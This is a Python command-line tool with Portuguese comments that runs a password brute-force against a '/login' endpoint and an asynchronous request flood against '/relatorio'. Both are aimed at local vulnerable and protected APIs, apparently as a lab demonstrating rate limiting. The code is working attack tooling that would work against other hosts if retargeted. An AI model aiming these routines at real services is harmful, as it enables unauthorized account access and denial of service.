"""
Ferramenta de ataque CLI para simulação de Brute Force e DoS.

Uso:
    python atacar.py --alvo [vuln|secure] --ataque [bruteforce|dos]

Exemplos:
    python atacar.py --alvo vuln --ataque bruteforce
    python atacar.py --alvo secure --ataque dos
"""

import argparse
import asyncio
import json
import os
import sys
import time
from datetime import datetime

import aiohttp
import requests

# ── Configuração ──────────────────────────────────────────────────────────────

ALVOS = {
    "vuln": {"url": "http://localhost:8081", "nome": "API Vulnerável"},
    "secure": {"url": "http://localhost:8082", "nome": "API Protegida"},
}

WORDLIST_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlist.txt")
LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "logs")

# Parâmetros do ataque DoS
DOS_WORKERS = 50
DOS_DURACAO_SEGUNDOS = 30


# ── Ataque Brute Force ───────────────────────────────────────────────────────

def ataque_bruteforce(base_url, nome_alvo):
    """Tenta descobrir a senha do admin via wordlist."""
    print(f"\n{'='*60}")
    print(f"  BRUTE FORCE contra {nome_alvo}")
    print(f"  Alvo: {base_url}/login")
    print(f"{'='*60}\n")

    # Carregar wordlist
    if not os.path.exists(WORDLIST_PATH):
        print(f"ERRO: Wordlist não encontrada em {WORDLIST_PATH}")
        sys.exit(1)

    with open(WORDLIST_PATH, "r", encoding="utf-8") as f:
        senhas = [linha.strip() for linha in f if linha.strip()]

    print(f"Wordlist carregada: {len(senhas)} senhas para testar\n")

    resultados = {
        "tipo_ataque": "bruteforce",
        "alvo": nome_alvo,
        "url": base_url,
        "inicio": datetime.now().isoformat(),
        "total_tentativas": 0,
        "senha_encontrada": None,
        "tentativas": [],
    }

    for i, senha in enumerate(senhas, 1):
        try:
            inicio = time.time()
            resp = requests.post(
                f"{base_url}/login",
                json={"username": "admin", "password": senha},
                timeout=10,
            )
            tempo = round(time.time() - inicio, 4)

            tentativa = {
                "numero": i,
                "senha": senha,
                "status_code": resp.status_code,
                "tempo_resposta": tempo,
            }
            resultados["tentativas"].append(tentativa)
            resultados["total_tentativas"] = i

            # Mostrar progresso
            status_icon = "✓" if resp.status_code == 200 else "✗" if resp.status_code == 401 else "⚠"
            print(f"  [{i:>4}/{len(senhas)}] {status_icon} '{senha}' → {resp.status_code} ({tempo}s)")

            if resp.status_code == 200:
                print(f"\n  🔑 SENHA ENCONTRADA: '{senha}' (tentativa #{i})")
                resultados["senha_encontrada"] = senha
                break
            elif resp.status_code == 429:
                print(f"\n  🛡️  Bloqueado pelo rate limiting (429). Ataque interrompido.")
                break

        except requests.exceptions.RequestException as e:
            print(f"  [{i:>4}] ERRO: {str(e)}")
            resultados["tentativas"].append({
                "numero": i, "senha": senha, "status_code": 0, "erro": str(e)
            })

    resultados["fim"] = datetime.now().isoformat()

    # Estatísticas
    codigos = {}
    for t in resultados["tentativas"]:
        code = t.get("status_code", 0)
        codigos[code] = codigos.get(code, 0) + 1

    resultados["estatisticas"] = {
        "codigos_http": codigos,
        "tempo_total": round(
            (datetime.fromisoformat(resultados["fim"]) - datetime.fromisoformat(resultados["inicio"])).total_seconds(), 2
        ),
    }

    print(f"\n{'─'*60}")
    print(f"  Tentativas: {resultados['total_tentativas']}")
    print(f"  Códigos HTTP: {codigos}")
    print(f"  Tempo total: {resultados['estatisticas']['tempo_total']}s")
    print(f"{'─'*60}")

    return resultados


# ── Ataque DoS ────────────────────────────────────────────────────────────────

async def worker_dos(session, url, resultados_lista, worker_id, fim_evento):
    """Worker assíncrono que envia requisições ao /relatorio."""
    while not fim_evento.is_set():
        inicio = time.time()
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                status = resp.status
                # Ler resposta para forçar processamento completo
                await resp.read()
                tempo = round(time.time() - inicio, 4)
                resultados_lista.append({
                    "worker": worker_id,
                    "status_code": status,
                    "tempo_resposta": tempo,
                    "timestamp": time.time(),
                })
        except asyncio.TimeoutError:
            tempo = round(time.time() - inicio, 4)
            resultados_lista.append({
                "worker": worker_id,
                "status_code": 0,
                "erro": "timeout",
                "tempo_resposta": tempo,
                "timestamp": time.time(),
            })
        except Exception as e:
            tempo = round(time.time() - inicio, 4)
            resultados_lista.append({
                "worker": worker_id,
                "status_code": 0,
                "erro": str(e),
                "tempo_resposta": tempo,
                "timestamp": time.time(),
            })


async def ataque_dos_async(base_url, nome_alvo):
    """Dispara milhares de requisições concorrentes contra /relatorio."""
    print(f"\n{'='*60}")
    print(f"  DoS contra {nome_alvo}")
    print(f"  Alvo: {base_url}/relatorio")
    print(f"  Workers: {DOS_WORKERS} | Duração: {DOS_DURACAO_SEGUNDOS}s")
    print(f"{'='*60}\n")

    url = f"{base_url}/relatorio"
    resultados_lista = []
    fim_evento = asyncio.Event()

    inicio_global = time.time()

    connector = aiohttp.TCPConnector(limit=DOS_WORKERS, limit_per_host=DOS_WORKERS)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Lançar workers
        tasks = []
        for i in range(DOS_WORKERS):
            task = asyncio.create_task(worker_dos(session, url, resultados_lista, i, fim_evento))
            tasks.append(task)

        # Monitorar progresso
        print("  Ataque em andamento...")
        while time.time() - inicio_global < DOS_DURACAO_SEGUNDOS:
            await asyncio.sleep(2)
            elapsed = round(time.time() - inicio_global, 1)
            print(f"    [{elapsed}s/{DOS_DURACAO_SEGUNDOS}s] Requisições enviadas: {len(resultados_lista)}")

        # Sinalizar fim
        fim_evento.set()
        # Esperar tasks terminarem (com timeout)
        await asyncio.sleep(1)
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    tempo_total = round(time.time() - inicio_global, 2)

    # Estatísticas
    codigos = {}
    tempos = []
    erros = 0
    for r in resultados_lista:
        code = r.get("status_code", 0)
        codigos[code] = codigos.get(code, 0) + 1
        if r.get("tempo_resposta"):
            tempos.append(r["tempo_resposta"])
        if r.get("erro"):
            erros += 1

    tempos.sort()
    avg_tempo = round(sum(tempos) / len(tempos), 4) if tempos else 0
    p95_tempo = round(tempos[int(len(tempos) * 0.95)] if tempos else 0, 4)

    print(f"\n{'─'*60}")
    print(f"  Total de requisições: {len(resultados_lista)}")
    print(f"  Códigos HTTP: {codigos}")
    print(f"  Erros/Timeouts: {erros}")
    print(f"  Tempo médio de resposta: {avg_tempo}s")
    print(f"  Tempo p95 de resposta: {p95_tempo}s")
    print(f"  Duração total: {tempo_total}s")
    print(f"{'─'*60}")

    return {
        "tipo_ataque": "dos",
        "alvo": nome_alvo,
        "url": base_url,
        "inicio": datetime.fromtimestamp(inicio_global).isoformat(),
        "fim": datetime.now().isoformat(),
        "config": {"workers": DOS_WORKERS, "duracao_segundos": DOS_DURACAO_SEGUNDOS},
        "estatisticas": {
            "total_requisicoes": len(resultados_lista),
            "codigos_http": codigos,
            "erros_timeouts": erros,
            "tempo_resposta_medio": avg_tempo,
            "tempo_resposta_p95": p95_tempo,
            "tempo_total": tempo_total,
        },
    }


def ataque_dos(base_url, nome_alvo):
    """Wrapper síncrono para o ataque DoS assíncrono."""
    return asyncio.run(ataque_dos_async(base_url, nome_alvo))


# ── Salvar resultados ─────────────────────────────────────────────────────────

def salvar_resultados(resultados):
    """Salva relatório do ataque em JSON."""
    os.makedirs(LOG_DIR, exist_ok=True)

    tipo = resultados["tipo_ataque"]
    alvo = "vuln" if "Vulnerável" in resultados["alvo"] else "secure"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ataque_{tipo}_{alvo}_{timestamp}.json"
    filepath = os.path.join(LOG_DIR, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(resultados, f, indent=2, ensure_ascii=False)

    print(f"\n  📄 Relatório salvo em: {filepath}")
    return filepath


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Ferramenta de simulação de ataques (Brute Force / DoS)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python atacar.py --alvo vuln --ataque bruteforce
  python atacar.py --alvo secure --ataque dos
        """,
    )
    parser.add_argument(
        "--alvo",
        choices=["vuln", "secure"],
        required=True,
        help="Alvo do ataque: 'vuln' (API vulnerável, porta 8081) ou 'secure' (API protegida, porta 8082)",
    )
    parser.add_argument(
        "--ataque",
        choices=["bruteforce", "dos"],
        required=True,
        help="Tipo de ataque: 'bruteforce' (testa senhas via /login) ou 'dos' (sobrecarga via /relatorio)",
    )

    args = parser.parse_args()

    alvo_info = ALVOS[args.alvo]
    base_url = alvo_info["url"]
    nome_alvo = alvo_info["nome"]

    # Verificar se API está acessível
    print(f"\nVerificando conectividade com {nome_alvo} ({base_url})...")
    try:
        resp = requests.get(f"{base_url}/health", timeout=5)
        if resp.status_code == 200:
            print(f"  ✓ API acessível: {resp.json()}")
        else:
            print(f"  ⚠ API respondeu com status {resp.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"  ✗ Não foi possível conectar em {base_url}. Verifique se os containers estão rodando.")
        sys.exit(1)

    # Executar ataque
    if args.ataque == "bruteforce":
        resultados = ataque_bruteforce(base_url, nome_alvo)
    else:
        resultados = ataque_dos(base_url, nome_alvo)

    # Salvar resultados
    salvar_resultados(resultados)


if __name__ == "__main__":
    main()
